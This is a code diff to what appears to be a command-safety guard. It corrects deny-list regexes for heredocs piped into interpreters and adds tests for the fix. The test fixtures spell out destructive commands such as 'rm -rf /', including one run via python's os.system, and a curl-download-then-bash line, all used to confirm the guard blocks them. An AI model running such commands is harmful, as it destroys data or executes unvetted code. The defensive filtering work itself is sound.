@@ -989,11 +989,25 @@ fn builtin_deny() -> Vec<Pattern> {
             "pipe to tclsh",
             r"\|\s*(?:(?:command|exec|env|nohup|nice|sudo)\s+(?:-\S+\s+)*)?(?:[\w./]*/)?tclsh(?:\d[\d.]*)?\b",
         ),
-        // Heredoc to interpreter
-        ("heredoc to bash", r"\bbash\s+<<"),
-        ("heredoc to sh", r"\bsh\s+<<"),
-        ("heredoc to zsh", r"\bzsh\s+<<"),
-        ("heredoc to python", r"\bpython3?\s+<<"),
+        // Heredoc to interpreter — piping heredoc content directly into an
+        // interpreter's stdin (`sh << EOF ... EOF`) executes immediately with
+        // no chance to inspect it first, unlike `cat > file << EOF ... EOF;
+        // bash file`, which the write-then-exec heredoc-content-scanner
+        // (issue #216, `try_scan_heredoc_content`) already handles safely by
+        // extracting and scanning the body before deciding.
+        //
+        // Uses `(?:^|[^.\w])` instead of `\b` before the interpreter name —
+        // `\b` fires right after `.` too (it's a non-word char), so `\bsh\s+<<`
+        // also matched the *file extension* in `cat > script.sh << 'EOF'`,
+        // an extremely common, benign way to write-then-run a temp script.
+        // That false-positive denied the command outright, short-circuiting
+        // the heredoc-content-scanner before it ever got a chance to run.
+        // Same fix already applied to `exec_re` elsewhere in this file (see
+        // its comment for the identical `.sh`-extension gotcha).
+        ("heredoc to bash", r"(?:^|[^.\w])bash\s+<<"),
+        ("heredoc to sh", r"(?:^|[^.\w])sh\s+<<"),
+        ("heredoc to zsh", r"(?:^|[^.\w])zsh\s+<<"),
+        ("heredoc to python", r"(?:^|[^.\w])python3?\s+<<"),
         // Pipe to database CLI
         ("pipe to psql", r"\|\s*psql\b"),
         ("pipe to mysql", r"\|\s*mysql\b"),
@@ -8480,6 +8494,69 @@ mod tests {
         assert_eq!(
             decision("curl http://example.com/s > /tmp/run.sh && bash /tmp/run.sh"),
             Some("ask".into())
+        );
+    }
+
+    // ── heredoc-to-interpreter false positive on file extensions ──────────────
+    // Real-world bug (reported by a user): `\bsh\s+<<` etc. matched the `.sh`
+    // file extension immediately before a heredoc redirect (`\b` fires right
+    // after `.` too, since it's a non-word char), so `cat > script.sh <<
+    // 'EOF'` — an extremely common way to write-then-run a temp script — was
+    // denied outright by the blunt "heredoc to sh" builtin_deny pattern,
+    // short-circuiting the smarter heredoc-content-scanner (issue #216)
+    // before it ever got a chance to inspect the actual content.
+
+    #[test]
+    fn write_then_exec_heredoc_to_sh_extension_benign_passes() {
+        // The exact reported shape: redirect target has a `.sh` extension
+        // immediately before the heredoc opener.
+        let cmd = "cat > /tmp/script.sh << 'EOF'\necho hello\nEOF\nbash /tmp/script.sh";
+        assert_eq!(decision(cmd), None);
+    }
+
+    #[test]
+    fn write_then_exec_heredoc_to_sh_extension_dangerous_denies() {
+        // Same shape, but the content-scanner must still catch real danger —
+        // the fix must not turn this into a blanket allow.
+        let cmd = "cat > /tmp/bad.sh << 'EOF'\nrm -rf /\nEOF\nbash /tmp/bad.sh";
+        assert_eq!(decision(cmd), Some("deny".into()));
+    }
+
+    #[test]
+    fn write_then_exec_heredoc_to_bash_extension_benign_passes() {
+        let cmd = "cat > /tmp/script.bash << 'EOF'\necho hello\nEOF\nbash /tmp/script.bash";
+        assert_eq!(decision(cmd), None);
+    }
+
+    #[test]
+    fn write_then_exec_heredoc_to_zsh_extension_benign_passes() {
+        let cmd = "cat > /tmp/script.zsh << 'EOF'\necho hello\nEOF\nzsh /tmp/script.zsh";
+        assert_eq!(decision(cmd), None);
+    }
+
+    #[test]
+    fn heredoc_to_sh_direct_stdin_pipe_still_denied() {
+        // The genuine danger this pattern exists for must still be caught:
+        // piping heredoc content directly into an interpreter's stdin
+        // executes immediately with no file, no scan, no chance to inspect.
+        assert_eq!(decision("sh << EOF\necho hello\nEOF"), Some("deny".into()));
+    }
+
+    #[test]
+    fn heredoc_to_bash_direct_stdin_pipe_still_denied() {
+        assert_eq!(decision("bash << EOF\nrm -rf /\nEOF"), Some("deny".into()));
+    }
+
+    #[test]
+    fn heredoc_to_zsh_direct_stdin_pipe_still_denied() {
+        assert_eq!(decision("zsh << EOF\nrm -rf /\nEOF"), Some("deny".into()));
+    }
+
+    #[test]
+    fn heredoc_to_python_direct_stdin_pipe_still_denied() {
+        assert_eq!(
+            decision("python3 << EOF\nimport os; os.system('rm -rf /')\nEOF"),
+            Some("deny".into())
         );
     }
 
